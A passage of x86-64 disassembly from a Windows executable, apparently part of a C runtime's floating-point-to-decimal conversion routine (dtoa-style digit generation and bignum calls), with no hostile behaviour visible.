   140009734:	44 8b 54 24 30       	mov    0x30(%rsp),%r10d
   140009739:	45 31 db             	xor    %r11d,%r11d
   14000973c:	44 8b 6c 24 50       	mov    0x50(%rsp),%r13d
   140009741:	66 48 0f 6e d0       	movq   %rax,%xmm2
   140009746:	48 8b 15 03 05 38 00 	mov    0x380503(%rip),%rdx        # 0x140389c50
   14000974d:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   140009751:	48 98                	cltq
   140009753:	45 85 ed             	test   %r13d,%r13d
   140009756:	f2 0f 10 24 c2       	movsd  (%rdx,%rax,8),%xmm4
   14000975b:	0f 84 83 0c 00 00    	je     0x14000a3e4
   140009761:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
   140009765:	f2 0f 10 0d 33 02 38 	movsd  0x380233(%rip),%xmm1        # 0x1403899a0
   14000976c:	00 
   14000976d:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140009772:	f2 0f 5e cc          	divsd  %xmm4,%xmm1
   140009776:	8d 50 30             	lea    0x30(%rax),%edx
   140009779:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   14000977d:	88 55 00             	mov    %dl,0x0(%rbp)
   140009780:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
   140009784:	66 0f ef d2          	pxor   %xmm2,%xmm2
   140009788:	f2 0f 2a d0          	cvtsi2sd %eax,%xmm2
   14000978c:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   140009790:	66 0f 2f c8          	comisd %xmm0,%xmm1
   140009794:	0f 87 86 00 00 00    	ja     0x140009820
   14000979a:	f2 0f 10 25 c6 01 38 	movsd  0x3801c6(%rip),%xmm4        # 0x140389968
   1400097a1:	00 
   1400097a2:	66 0f 28 d4          	movapd %xmm4,%xmm2
   1400097a6:	f2 0f 5c d0          	subsd  %xmm0,%xmm2
   1400097aa:	66 0f 2f ca          	comisd %xmm2,%xmm1
   1400097ae:	0f 87 42 11 00 00    	ja     0x14000a8f6
   1400097b4:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   1400097b8:	83 c0 01             	add    $0x1,%eax
   1400097bb:	44 39 d0             	cmp    %r10d,%eax
   1400097be:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   1400097c2:	0f 8d a5 04 00 00    	jge    0x140009c6d
   1400097c8:	f2 0f 10 1d a0 01 38 	movsd  0x3801a0(%rip),%xmm3        # 0x140389970
   1400097cf:	00 
   1400097d0:	eb 26                	jmp    0x1400097f8
   1400097d2:	66 0f 28 d4          	movapd %xmm4,%xmm2
   1400097d6:	f2 0f 5c d0          	subsd  %xmm0,%xmm2
   1400097da:	66 0f 2f ca          	comisd %xmm2,%xmm1
   1400097de:	0f 87 17 10 00 00    	ja     0x14000a7fb
   1400097e4:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   1400097e8:	83 c0 01             	add    $0x1,%eax
   1400097eb:	44 39 d0             	cmp    %r10d,%eax
   1400097ee:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   1400097f2:	0f 8d 75 04 00 00    	jge    0x140009c6d
   1400097f8:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
   1400097fc:	66 0f ef d2          	pxor   %xmm2,%xmm2
   140009800:	48 83 c1 01          	add    $0x1,%rcx
   140009804:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
   140009808:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
   14000980c:	f2 0f 2a d0          	cvtsi2sd %eax,%xmm2
   140009810:	83 c0 30             	add    $0x30,%eax
   140009813:	88 41 ff             	mov    %al,-0x1(%rcx)
   140009816:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
   14000981a:	66 0f 2f c8          	comisd %xmm0,%xmm1
   14000981e:	76 b2                	jbe    0x1400097d2
   140009820:	66 0f 2e c6          	ucomisd %xmm6,%xmm0
   140009824:	41 8d 43 01          	lea    0x1(%r11),%eax
   140009828:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   14000982c:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009831:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140009836:	7a 06                	jp     0x14000983e
   140009838:	0f 84 21 03 00 00    	je     0x140009b5f
   14000983e:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140009844:	e9 16 03 00 00       	jmp    0x140009b5f
   140009849:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009850:	45 85 c9             	test   %r9d,%r9d
   140009853:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
   14000985a:	00 
   14000985b:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   140009862:	00 
   140009863:	0f 88 47 03 00 00    	js     0x140009bb0
   140009869:	8b 4c 24 2c          	mov    0x2c(%rsp),%ecx
   14000986d:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   140009874:	00 
   140009875:	41 01 c9             	add    %ecx,%r9d
   140009878:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   14000987c:	e9 61 fd ff ff       	jmp    0x1400095e2
   140009881:	c7 84 24 00 01 00 00 	movl   $0x0,0x100(%rsp)
   140009888:	00 00 00 00 
   14000988c:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140009890:	f2 0f 2a c7          	cvtsi2sd %edi,%xmm0
   140009894:	44 89 4c 24 30       	mov    %r9d,0x30(%rsp)
   140009899:	f2 0f 59 05 bf 00 38 	mulsd  0x3800bf(%rip),%xmm0        # 0x140389960
   1400098a0:	00 
   1400098a1:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
   1400098a5:	83 c1 03             	add    $0x3,%ecx
   1400098a8:	89 4c 24 7c          	mov    %ecx,0x7c(%rsp)
   1400098ac:	e8 7f f7 ff ff       	call   0x140009030
   1400098b1:	44 8b 4c 24 30       	mov    0x30(%rsp),%r9d
   1400098b6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400098bb:	8b 43 0c             	mov    0xc(%rbx),%eax
   1400098be:	83 e8 01             	sub    $0x1,%eax
   1400098c1:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400098c5:	0f 85 25 03 00 00    	jne    0x140009bf0
   1400098cb:	45 85 e4             	test   %r12d,%r12d
   1400098ce:	0f 88 e5 09 00 00    	js     0x14000a2b9
   1400098d4:	8b 44 24 54          	mov    0x54(%rsp),%eax
   1400098d8:	3b 43 14             	cmp    0x14(%rbx),%eax
   1400098db:	0f 8e 91 08 00 00    	jle    0x14000a172
   1400098e1:	c7 84 24 08 01 00 00 	movl   $0x0,0x108(%rsp)
   1400098e8:	00 00 00 00 
   1400098ec:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400098f1:	89 44 24 30          	mov    %eax,0x30(%rsp)
   1400098f5:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   1400098f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009900:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140009903:	44 29 f7             	sub    %r14d,%edi
   140009906:	44 89 e0             	mov    %r12d,%eax
   140009909:	8d 57 01             	lea    0x1(%rdi),%edx
   14000990c:	29 f8                	sub    %edi,%eax
   14000990e:	89 54 24 7c          	mov    %edx,0x7c(%rsp)
   140009912:	39 c8                	cmp    %ecx,%eax
   140009914:	0f 8d e6 06 00 00    	jge    0x14000a000
   14000991a:	8b 84 24 00 01 00 00 	mov    0x100(%rsp),%eax
   140009921:	83 e8 03             	sub    $0x3,%eax
   140009924:	83 e0 fd             	and    $0xfffffffd,%eax
   140009927:	0f 84 d3 06 00 00    	je     0x14000a000
   14000992d:	41 29 cc             	sub    %ecx,%r12d
   140009930:	8b 7c 24 30          	mov    0x30(%rsp),%edi
   140009934:	83 bc 24 00 01 00 00 	cmpl   $0x1,0x100(%rsp)
   14000993b:	01 
   14000993c:	41 8d 44 24 01       	lea    0x1(%r12),%eax
   140009941:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   140009945:	0f 9f c1             	setg   %cl
   140009948:	85 ff                	test   %edi,%edi
   14000994a:	0f 9f c2             	setg   %dl
   14000994d:	84 d1                	test   %dl,%cl
   14000994f:	74 08                	je     0x140009959
   140009951:	39 f8                	cmp    %edi,%eax
   140009953:	0f 8f b5 06 00 00    	jg     0x14000a00e
   140009959:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   14000995d:	41 01 c1             	add    %eax,%r9d
   140009960:	8b 6c 24 58          	mov    0x58(%rsp),%ebp
   140009964:	01 c8                	add    %ecx,%eax
   140009966:	89 cf                	mov    %ecx,%edi
   140009968:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000996c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009971:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   140009976:	e8 25 14 00 00       	call   0x14000ada0
   14000997b:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
   140009980:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140009987:	00 
   140009988:	49 89 c5             	mov    %rax,%r13
   14000998b:	85 ff                	test   %edi,%edi
   14000998d:	7e 1b                	jle    0x1400099aa
   14000998f:	45 85 c9             	test   %r9d,%r9d
   140009992:	7e 16                	jle    0x1400099aa
   140009994:	44 39 cf             	cmp    %r9d,%edi
   140009997:	44 89 c8             	mov    %r9d,%eax
   14000999a:	0f 4e c7             	cmovle %edi,%eax
   14000999d:	29 44 24 48          	sub    %eax,0x48(%rsp)
   1400099a1:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   1400099a5:	29 c7                	sub    %eax,%edi
   1400099a7:	41 29 c1             	sub    %eax,%r9d
   1400099aa:	8b 54 24 58          	mov    0x58(%rsp),%edx
   1400099ae:	85 d2                	test   %edx,%edx
   1400099b0:	74 4c                	je     0x1400099fe
   1400099b2:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1400099b6:	85 c0                	test   %eax,%eax
   1400099b8:	0f 84 a2 08 00 00    	je     0x14000a260
   1400099be:	85 ed                	test   %ebp,%ebp
   1400099c0:	7e 30                	jle    0x1400099f2
   1400099c2:	4c 89 e9             	mov    %r13,%rcx
   1400099c5:	89 ea                	mov    %ebp,%edx
   1400099c7:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   1400099cc:	e8 2f 15 00 00       	call   0x14000af00
   1400099d1:	4c 89 fa             	mov    %r15,%rdx
   1400099d4:	48 89 c1             	mov    %rax,%rcx
   1400099d7:	49 89 c5             	mov    %rax,%r13
   1400099da:	e8 f1 13 00 00       	call   0x14000add0
   1400099df:	4c 89 f9             	mov    %r15,%rcx
   1400099e2:	49 89 c4             	mov    %rax,%r12
   1400099e5:	e8 86 12 00 00       	call   0x14000ac70
   1400099ea:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
   1400099ef:	4d 89 e7             	mov    %r12,%r15
   1400099f2:	8b 54 24 58          	mov    0x58(%rsp),%edx
   1400099f6:	29 ea                	sub    %ebp,%edx
   1400099f8:	0f 85 22 09 00 00    	jne    0x14000a320
   1400099fe:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009a03:	44 89 4c 24 58       	mov    %r9d,0x58(%rsp)
   140009a08:	e8 93 13 00 00       	call   0x14000ada0
   140009a0d:	41 83 fe 01          	cmp    $0x1,%r14d
   140009a11:	8b 54 24 2c          	mov    0x2c(%rsp),%edx
   140009a15:	41 0f 94 c4          	sete   %r12b
   140009a19:	83 bc 24 00 01 00 00 	cmpl   $0x1,0x100(%rsp)
   140009a20:	01 
   140009a21:	48 89 c5             	mov    %rax,%rbp
   140009a24:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
   140009a29:	0f 9e c0             	setle  %al
   140009a2c:	41 21 c4             	and    %eax,%r12d
   140009a2f:	85 d2                	test   %edx,%edx
   140009a31:	0f 8f 5b 03 00 00    	jg     0x140009d92
   140009a37:	45 84 e4             	test   %r12b,%r12b
   140009a3a:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   140009a41:	00 
   140009a42:	0f 85 ef 0b 00 00    	jne    0x14000a637
   140009a48:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   140009a4c:	41 bc 1f 00 00 00    	mov    $0x1f,%r12d
   140009a52:	85 c0                	test   %eax,%eax
   140009a54:	0f 85 59 03 00 00    	jne    0x140009db3
   140009a5a:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140009a5e:	45 29 cc             	sub    %r9d,%r12d
   140009a61:	41 83 ec 04          	sub    $0x4,%r12d
   140009a65:	41 83 e4 1f          	and    $0x1f,%r12d
   140009a69:	44 89 64 24 7c       	mov    %r12d,0x7c(%rsp)
   140009a6e:	44 89 e0             	mov    %r12d,%eax
   140009a71:	44 01 e2             	add    %r12d,%edx
   140009a74:	85 d2                	test   %edx,%edx
   140009a76:	7e 19                	jle    0x140009a91
   140009a78:	4c 89 f9             	mov    %r15,%rcx
   140009a7b:	44 89 4c 24 2c       	mov    %r9d,0x2c(%rsp)
   140009a80:	e8 0b 16 00 00       	call   0x14000b090
   140009a85:	44 8b 4c 24 2c       	mov    0x2c(%rsp),%r9d
   140009a8a:	49 89 c7             	mov    %rax,%r15
   140009a8d:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   140009a91:	41 8d 14 01          	lea    (%r9,%rax,1),%edx
   140009a95:	85 d2                	test   %edx,%edx
   140009a97:	7e 0b                	jle    0x140009aa4
   140009a99:	48 89 e9             	mov    %rbp,%rcx
   140009a9c:	e8 ef 15 00 00       	call   0x14000b090
   140009aa1:	48 89 c5             	mov    %rax,%rbp
   140009aa4:	83 bc 24 00 01 00 00 	cmpl   $0x2,0x100(%rsp)
   140009aab:	02 
   140009aac:	8b 44 24 5c          	mov    0x5c(%rsp),%eax
   140009ab0:	41 0f 9f c6          	setg   %r14b
   140009ab4:	85 c0                	test   %eax,%eax
   140009ab6:	0f 85 94 05 00 00    	jne    0x14000a050
   140009abc:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140009ac0:	85 c0                	test   %eax,%eax
   140009ac2:	0f 8f 08 03 00 00    	jg     0x140009dd0
   140009ac8:	45 84 f6             	test   %r14b,%r14b
   140009acb:	0f 84 ff 02 00 00    	je     0x140009dd0
   140009ad1:	8b 7c 24 30          	mov    0x30(%rsp),%edi
   140009ad5:	85 ff                	test   %edi,%edi
   140009ad7:	0f 85 98 02 00 00    	jne    0x140009d75
   140009add:	45 31 c0             	xor    %r8d,%r8d
   140009ae0:	48 89 e9             	mov    %rbp,%rcx
   140009ae3:	ba 05 00 00 00       	mov    $0x5,%edx
   140009ae8:	e8 f3 11 00 00       	call   0x14000ace0
   140009aed:	4c 89 f9             	mov    %r15,%rcx
   140009af0:	48 89 c2             	mov    %rax,%rdx
   140009af3:	48 89 c5             	mov    %rax,%rbp
   140009af6:	e8 85 16 00 00       	call   0x14000b180
   140009afb:	85 c0                	test   %eax,%eax
   140009afd:	0f 8e 72 02 00 00    	jle    0x140009d75
   140009b03:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140009b07:	83 c0 02             	add    $0x2,%eax
   140009b0a:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140009b0e:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009b13:	48 83 44 24 40 01    	addq   $0x1,0x40(%rsp)
   140009b19:	c6 00 31             	movb   $0x31,(%rax)
   140009b1c:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140009b22:	48 89 e9             	mov    %rbp,%rcx
   140009b25:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140009b2a:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140009b2f:	e8 3c 11 00 00       	call   0x14000ac70
   140009b34:	4d 85 ed             	test   %r13,%r13
   140009b37:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   140009b3c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140009b41:	74 1c                	je     0x140009b5f
   140009b43:	4c 89 e9             	mov    %r13,%rcx
   140009b46:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140009b4b:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140009b50:	e8 1b 11 00 00       	call   0x14000ac70
   140009b55:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   140009b5a:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140009b5f:	4c 89 f9             	mov    %r15,%rcx
   140009b62:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140009b67:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140009b6c:	e8 ff 10 00 00       	call   0x14000ac70
   140009b71:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140009b78:	00 
   140009b79:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140009b7e:	8b 5c 24 2c          	mov    0x2c(%rsp),%ebx
   140009b82:	48 83 bc 24 18 01 00 	cmpq   $0x0,0x118(%rsp)
   140009b89:	00 00 
   140009b8b:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   140009b90:	c6 07 00             	movb   $0x0,(%rdi)
   140009b93:	89 18                	mov    %ebx,(%rax)
   140009b95:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140009b9a:	74 0b                	je     0x140009ba7
   140009b9c:	48 8b 9c 24 18 01 00 	mov    0x118(%rsp),%rbx
   140009ba3:	00 
   140009ba4:	48 89 3b             	mov    %rdi,(%rbx)
   140009ba7:	44 09 06             	or     %r8d,(%rsi)
   140009baa:	e9 72 f7 ff ff       	jmp    0x140009321
   140009baf:	90                   	nop
   140009bb0:	ba 01 00 00 00       	mov    $0x1,%edx
   140009bb5:	45 31 c9             	xor    %r9d,%r9d
   140009bb8:	29 ca                	sub    %ecx,%edx
   140009bba:	89 54 24 48          	mov    %edx,0x48(%rsp)
   140009bbe:	e9 f7 f9 ff ff       	jmp    0x1400095ba
   140009bc3:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140009bc7:	f2 0f 2a c1          	cvtsi2sd %ecx,%xmm0
   140009bcb:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
   140009bcf:	7a 06                	jp     0x140009bd7
   140009bd1:	0f 84 39 f9 ff ff    	je     0x140009510
   140009bd7:	83 6c 24 2c 01       	subl   $0x1,0x2c(%rsp)
   140009bdc:	e9 2f f9 ff ff       	jmp    0x140009510
   140009be1:	83 ac 24 00 01 00 00 	subl   $0x4,0x100(%rsp)
   140009be8:	04 
   140009be9:	31 ed                	xor    %ebp,%ebp
   140009beb:	e9 1e fa ff ff       	jmp    0x14000960e
   140009bf0:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140009bf5:	31 ed                	xor    %ebp,%ebp
   140009bf7:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140009bfe:	00 
   140009bff:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   140009c03:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140009c07:	c7 84 24 08 01 00 00 	movl   $0x0,0x108(%rsp)
   140009c0e:	00 00 00 00 
   140009c12:	e9 78 fa ff ff       	jmp    0x14000968f
   140009c17:	66 0f 28 c8          	movapd %xmm0,%xmm1
   140009c1b:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   140009c1f:	f2 0f 58 0d 59 fd 37 	addsd  0x37fd59(%rip),%xmm1        # 0x140389980
   140009c26:	00 
   140009c27:	66 48 0f 7e ca       	movq   %xmm1,%rdx
   140009c2c:	66 48 0f 7e c8       	movq   %xmm1,%rax
   140009c31:	48 c1 ea 20          	shr    $0x20,%rdx
   140009c35:	89 c0                	mov    %eax,%eax
   140009c37:	81 ea 00 00 40 03    	sub    $0x3400000,%edx
   140009c3d:	48 c1 e2 20          	shl    $0x20,%rdx
   140009c41:	48 09 d0             	or     %rdx,%rax
   140009c44:	f2 0f 5c 05 3c fd 37 	subsd  0x37fd3c(%rip),%xmm0        # 0x140389988
   140009c4b:	00 
   140009c4c:	66 48 0f 6e c8       	movq   %rax,%xmm1
   140009c51:	66 0f 2f c1          	comisd %xmm1,%xmm0
   140009c55:	0f 87 05 0a 00 00    	ja     0x14000a660
   140009c5b:	66 0f 57 0d 2d fd 37 	xorpd  0x37fd2d(%rip),%xmm1        # 0x140389990
   140009c62:	00 
   140009c63:	66 0f 2f c8          	comisd %xmm0,%xmm1
   140009c67:	0f 87 03 01 00 00    	ja     0x140009d70
   140009c6d:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140009c74:	00 
   140009c75:	45 85 e4             	test   %r12d,%r12d
   140009c78:	0f 88 d2 00 00 00    	js     0x140009d50
   140009c7e:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140009c82:	39 43 14             	cmp    %eax,0x14(%rbx)
   140009c85:	0f 8c c5 00 00 00    	jl     0x140009d50
   140009c8b:	44 8b 84 24 08 01 00 	mov    0x108(%rsp),%r8d
   140009c92:	00 
   140009c93:	48 98                	cltq
   140009c95:	48 8b 15 b4 ff 37 00 	mov    0x37ffb4(%rip),%rdx        # 0x140389c50
   140009c9c:	48 89 c7             	mov    %rax,%rdi
   140009c9f:	45 85 c0             	test   %r8d,%r8d
   140009ca2:	f2 0f 10 14 c2       	movsd  (%rdx,%rax,8),%xmm2
   140009ca7:	0f 89 e3 04 00 00    	jns    0x14000a190
   140009cad:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140009cb1:	85 c0                	test   %eax,%eax
   140009cb3:	0f 8f d7 04 00 00    	jg     0x14000a190
   140009cb9:	0f 85 b1 00 00 00    	jne    0x140009d70
   140009cbf:	f2 0f 59 15 c1 fc 37 	mulsd  0x37fcc1(%rip),%xmm2        # 0x140389988
   140009cc6:	00 
   140009cc7:	66 0f 2f 54 24 60    	comisd 0x60(%rsp),%xmm2
   140009ccd:	0f 83 9d 00 00 00    	jae    0x140009d70
   140009cd3:	83 c7 02             	add    $0x2,%edi
   140009cd6:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009cdb:	31 ed                	xor    %ebp,%ebp
   140009cdd:	45 31 ed             	xor    %r13d,%r13d
   140009ce0:	89 7c 24 2c          	mov    %edi,0x2c(%rsp)
   140009ce4:	e9 2a fe ff ff       	jmp    0x140009b13
   140009ce9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009cf0:	83 bc 24 00 01 00 00 	cmpl   $0x2,0x100(%rsp)
   140009cf7:	02 
   140009cf8:	0f 85 8e fb ff ff    	jne    0x14000988c
   140009cfe:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140009d05:	00 
   140009d06:	e9 2d f9 ff ff       	jmp    0x140009638
   140009d0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009d10:	83 bc 24 00 01 00 00 	cmpl   $0x5,0x100(%rsp)
   140009d17:	05 
   140009d18:	0f 85 6e fb ff ff    	jne    0x14000988c
   140009d1e:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140009d25:	00 
   140009d26:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140009d2a:	03 84 24 08 01 00 00 	add    0x108(%rsp),%eax
   140009d31:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   140009d35:	83 c0 01             	add    $0x1,%eax
   140009d38:	85 c0                	test   %eax,%eax
   140009d3a:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140009d3e:	0f 8e 1c 04 00 00    	jle    0x14000a160
   140009d44:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   140009d48:	89 c1                	mov    %eax,%ecx
   140009d4a:	e9 16 f9 ff ff       	jmp    0x140009665
   140009d4f:	90                   	nop
   140009d50:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140009d54:	85 c9                	test   %ecx,%ecx
   140009d56:	0f 85 a4 fb ff ff    	jne    0x140009900
   140009d5c:	8b 6c 24 58          	mov    0x58(%rsp),%ebp
   140009d60:	45 31 ed             	xor    %r13d,%r13d
   140009d63:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   140009d67:	e9 1f fc ff ff       	jmp    0x14000998b
   140009d6c:	0f 1f 40 00          	nopl   0x0(%rax)
   140009d70:	31 ed                	xor    %ebp,%ebp
   140009d72:	45 31 ed             	xor    %r13d,%r13d
   140009d75:	8b 84 24 08 01 00 00 	mov    0x108(%rsp),%eax
   140009d7c:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140009d82:	f7 d8                	neg    %eax
   140009d84:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140009d88:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009d8d:	e9 90 fd ff ff       	jmp    0x140009b22
   140009d92:	48 89 e9             	mov    %rbp,%rcx
   140009d95:	e8 66 11 00 00       	call   0x14000af00
   140009d9a:	45 84 e4             	test   %r12b,%r12b
   140009d9d:	44 8b 4c 24 58       	mov    0x58(%rsp),%r9d
   140009da2:	48 89 c5             	mov    %rax,%rbp
   140009da5:	0f 85 11 09 00 00    	jne    0x14000a6bc
   140009dab:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
   140009db2:	00 
   140009db3:	8b 45 14             	mov    0x14(%rbp),%eax
   140009db6:	83 e8 01             	sub    $0x1,%eax
   140009db9:	48 98                	cltq
   140009dbb:	44 0f bd 64 85 18    	bsr    0x18(%rbp,%rax,4),%r12d
   140009dc1:	41 83 f4 1f          	xor    $0x1f,%r12d
   140009dc5:	e9 90 fc ff ff       	jmp    0x140009a5a
   140009dca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140009dd0:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140009dd4:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   140009dd8:	83 c0 01             	add    $0x1,%eax
   140009ddb:	85 db                	test   %ebx,%ebx
   140009ddd:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140009de1:	0f 84 c9 02 00 00    	je     0x14000a0b0
   140009de7:	41 8d 14 3c          	lea    (%r12,%rdi,1),%edx
   140009deb:	85 d2                	test   %edx,%edx
   140009ded:	7e 0b                	jle    0x140009dfa
   140009def:	4c 89 e9             	mov    %r13,%rcx
   140009df2:	e8 99 12 00 00       	call   0x14000b090
   140009df7:	49 89 c5             	mov    %rax,%r13
   140009dfa:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   140009dff:	4d 89 ec             	mov    %r13,%r12
   140009e02:	45 85 db             	test   %r11d,%r11d
   140009e05:	0f 85 f2 07 00 00    	jne    0x14000a5fd
   140009e0b:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009e10:	48 89 b4 24 f8 00 00 	mov    %rsi,0xf8(%rsp)
   140009e17:	00 
   140009e18:	c7 44 24 7c 01 00 00 	movl   $0x1,0x7c(%rsp)
   140009e1f:	00 
   140009e20:	48 89 c6             	mov    %rax,%rsi
   140009e23:	e9 aa 00 00 00       	jmp    0x140009ed2
   140009e28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140009e2f:	00 
   140009e30:	48 89 c1             	mov    %rax,%rcx
   140009e33:	e8 38 0e 00 00       	call   0x14000ac70
   140009e38:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140009e3e:	45 85 f6             	test   %r14d,%r14d
   140009e41:	0f 88 74 06 00 00    	js     0x14000a4bb
   140009e47:	44 0b b4 24 00 01 00 	or     0x100(%rsp),%r14d
   140009e4e:	00 
   140009e4f:	75 11                	jne    0x140009e62
   140009e51:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   140009e58:	00 
   140009e59:	f6 00 01             	testb  $0x1,(%rax)
   140009e5c:	0f 84 59 06 00 00    	je     0x14000a4bb
   140009e62:	48 8d 5e 01          	lea    0x1(%rsi),%rbx
   140009e66:	45 85 c0             	test   %r8d,%r8d
   140009e69:	7e 0b                	jle    0x140009e76
   140009e6b:	83 7c 24 38 02       	cmpl   $0x2,0x38(%rsp)
   140009e70:	0f 85 01 08 00 00    	jne    0x14000a677
   140009e76:	40 88 7b ff          	mov    %dil,-0x1(%rbx)
   140009e7a:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140009e7e:	39 44 24 7c          	cmp    %eax,0x7c(%rsp)
   140009e82:	0f 84 21 08 00 00    	je     0x14000a6a9
   140009e88:	45 31 c0             	xor    %r8d,%r8d
   140009e8b:	4c 89 f9             	mov    %r15,%rcx
   140009e8e:	ba 0a 00 00 00       	mov    $0xa,%edx
   140009e93:	e8 48 0e 00 00       	call   0x14000ace0
   140009e98:	45 31 c0             	xor    %r8d,%r8d
   140009e9b:	4d 39 e5             	cmp    %r12,%r13
   140009e9e:	ba 0a 00 00 00       	mov    $0xa,%edx
   140009ea3:	49 89 c7             	mov    %rax,%r15
   140009ea6:	4c 89 e9             	mov    %r13,%rcx
   140009ea9:	0f 84 41 01 00 00    	je     0x140009ff0
   140009eaf:	e8 2c 0e 00 00       	call   0x14000ace0
   140009eb4:	4c 89 e1             	mov    %r12,%rcx
   140009eb7:	45 31 c0             	xor    %r8d,%r8d
   140009eba:	ba 0a 00 00 00       	mov    $0xa,%edx
   140009ebf:	49 89 c5             	mov    %rax,%r13
   140009ec2:	e8 19 0e 00 00       	call   0x14000ace0
   140009ec7:	49 89 c4             	mov    %rax,%r12
   140009eca:	83 44 24 7c 01       	addl   $0x1,0x7c(%rsp)
   140009ecf:	48 89 de             	mov    %rbx,%rsi
   140009ed2:	48 89 ea             	mov    %rbp,%rdx
   140009ed5:	4c 89 f9             	mov    %r15,%rcx
   140009ed8:	e8 33 f2 ff ff       	call   0x140009110
   140009edd:	4c 89 ea             	mov    %r13,%rdx
   140009ee0:	4c 89 f9             	mov    %r15,%rcx
   140009ee3:	8d 78 30             	lea    0x30(%rax),%edi
